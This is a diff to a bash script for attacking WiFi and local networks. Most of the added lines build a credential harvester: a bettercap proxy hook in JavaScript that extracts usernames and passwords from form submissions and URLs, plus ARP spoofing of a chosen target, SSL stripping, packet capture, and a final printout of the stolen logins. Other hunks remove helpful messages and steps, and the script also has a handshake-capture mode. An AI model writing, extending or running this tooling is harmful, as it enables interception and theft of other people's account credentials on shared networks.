@@ -10,8 +10,88 @@ fi
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
+CRED_FILE="$SCRIPT_DIR/credentials.txt"
+CRED_HOOK="$SCRIPT_DIR/credential_hook.js"
 
 mkdir -p "$HANDSHAKE_DIR"
+
+if [[ ! -f "$CRED_HOOK" ]]; then
+    cat > "$CRED_HOOK" << EOF
+var LOGFILE = "$CRED_FILE";
+
+function writeLog(msg) {
+    try {
+        var f = new File(LOGFILE);
+        f.open("a");
+        f.write(msg + "\n");
+        f.close();
+    } catch (e) {}
+}
+
+function parseForm(body) {
+    var result = {};
+    if (!body) return result;
+    var pairs = body.split("&");
+    for (var i = 0; i < pairs.length; i++) {
+        var kv = pairs[i].split("=");
+        if (kv.length === 2) {
+            var key = decodeURIComponent(kv[0].replace(/\+/g, " "));
+            var val = decodeURIComponent(kv[1].replace(/\+/g, " "));
+            result[key.toLowerCase()] = val;
+        }
+    }
+    return result;
+}
+
+function onRequest(req, res) {
+    var foundUser = null;
+    var foundPass = null;
+    var data = "";
+
+    if (req.Method === "POST" && req.Body) {
+        data = req.Body;
+        var fields = parseForm(data);
+        var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
+        var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
+        for (var i = 0; i < userKeys.length; i++) {
+            if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
+        }
+        for (var i = 0; i < passKeys.length; i++) {
+            if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
+        }
+    }
+
+    if (req.Method === "GET" && req.Path) {
+        var qIdx = req.Path.indexOf("?");
+        if (qIdx !== -1) {
+            data = req.Path.substring(qIdx + 1);
+            var fields = parseForm(data);
+            var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
+            var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
+            for (var i = 0; i < userKeys.length; i++) {
+                if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
+            }
+            for (var i = 0; i < passKeys.length; i++) {
+                if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
+            }
+        }
+    }
+
+    if (foundUser !== null || foundPass !== null) {
+        var line = "========================================\n";
+        line += "TIME  : " + new Date().toString() + "\n";
+        line += "METHOD: " + req.Method + "\n";
+        line += "URL   : http://" + (req.Host || "unknown") + (req.Path || "unknown") + "\n";
+        line += "USER  : " + (foundUser !== null ? foundUser : "(not found)") + "\n";
+        line += "PASS  : " + (foundPass !== null ? foundPass : "(not found)") + "\n";
+        line += "DATA  : " + data + "\n";
+        line += "========================================";
+        log(line);
+        writeLog(line);
+    }
+}
+EOF
+fi
 
 print_section() {
     echo -e "\n${BLUE}${BOLD}┌──────────────────────────────────────────────────────┐${NC}"
@@ -123,14 +203,12 @@ else
 fi
 
 if command -v aircrack-ng &>/dev/null; then
-    AC_VERSION=$(aircrack-ng --version 2>&1 | head -n 1)
-    print_ok "aircrack-ng installed: ${BOLD}${AC_VERSION}${NC}"
+    print_ok "aircrack-ng installed."
 else
     print_warn "aircrack-ng not found. Installing..."
     apt update -qq && apt install -y aircrack-ng -qq
     if command -v aircrack-ng &>/dev/null; then
-        AC_VERSION=$(aircrack-ng --version 2>&1 | head -n 1)
-        print_ok "aircrack-ng installed: ${BOLD}${AC_VERSION}${NC}"
+        print_ok "aircrack-ng installed."
     else
         print_err "aircrack-ng installation failed. Install manually: apt install aircrack-ng"
         exit 1
@@ -174,7 +252,7 @@ read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-3]: ")" MODE
 if [[ "$MODE" == "1" ]]; then
     print_section "MITM Mode • Network Discovery"
 
-    reset_adapter "$IFACE"
+    sleep 2
 
     AUTO_GW=$(ip route | awk '/default/ {print $3; exit}')
     if [[ -z "$AUTO_GW" ]]; then
@@ -186,13 +264,15 @@ if [[ "$MODE" == "1" ]]; then
     fi
     print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"
 
-    print_info "Resolving gateway MAC (ping + arping)..."
+    print_info "Warming up gateway ARP cache..."
+    ping -c 3 -W 2 "$AUTO_GW" &>/dev/null
+    sleep 1
+
     GW_MAC=$(force_resolve_mac "$AUTO_GW" "$IFACE")
     if [[ -n "$GW_MAC" ]]; then
         print_ok "Gateway MAC: ${BOLD}${GW_MAC}${NC}"
     else
         print_warn "Gateway MAC still unresolved. Spoofing may fail."
-        print_info "Check AP isolation / firewall on router."
     fi
 
     echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -265,8 +345,7 @@ if [[ "$MODE" == "1" ]]; then
     print_info "Forcing target MAC resolution..."
     TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
     if [[ -z "$TARGET_MAC" ]]; then
-        print_err "Target MAC could not be resolved. Cannot spoof."
-        print_info "Make sure the device is online and reachable."
+        print_err "Target MAC could not be resolved."
         echo 0 > /proc/sys/net/ipv4/ip_forward
         exit 1
     fi
@@ -274,22 +353,45 @@ if [[ "$MODE" == "1" ]]; then
 
     sleep 3
 
+    rm -f "$CRED_FILE"
+
     print_info "Starting ARP spoof + sniff. Press Ctrl+C to stop."
     echo
 
     bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
-        set arp.spoof.fullduplex true;
-        set arp.spoof.targets $TARGET_IP;
-        set arp.spoof.internal true;
-        set net.sniff.verbose true;
-        arp.spoof on;
-        net.sniff on
-    "
+    set arp.spoof.fullduplex true;
+    set arp.spoof.targets $TARGET_IP;
+    set arp.spoof.internal false;
+    set net.sniff.verbose true;
+    set net.sniff.local true;
+    set net.sniff.filter 'host $TARGET_IP';
+    set net.sniff.output /tmp/mitm_capture.pcap;
+    set https.proxy.sslstrip true;
+    set https.proxy.script $CRED_HOOK;
+    arp.spoof on;
+    https.proxy on;
+    net.sniff on
+"
 
     echo
     print_info "Cleaning up..."
     echo 0 > /proc/sys/net/ipv4/ip_forward
     print_ok "IP Forwarding disabled."
+
+    print_section "Credentials Check"
+    if [[ -f "$CRED_FILE" ]] && [[ -s "$CRED_FILE" ]]; then
+        print_ok "${GREEN}${BOLD}Credentials captured!${NC}"
+        echo
+        cat "$CRED_FILE"
+        print_info "Saved to: ${BOLD}${CRED_FILE}${NC}"
+    else
+        print_warn "No credentials captured."
+        print_info "Possible reasons:"
+        echo -e "    ${DIM}• Target did not submit any HTTP login form${NC}"
+        echo -e "    ${DIM}• Login was over HTTPS (SSL strip failed or HSTS blocked)${NC}"
+        echo -e "    ${DIM}• Credentials field names not recognized by hook${NC}"
+        echo -e "    ${DIM}• Check pcap: /tmp/mitm_capture.pcap (Wireshark filter: http.request.method == \"POST\")${NC}"
+    fi
 
 elif [[ "$MODE" == "2" ]]; then
     print_section "Handshake Mode • WiFi Scan"
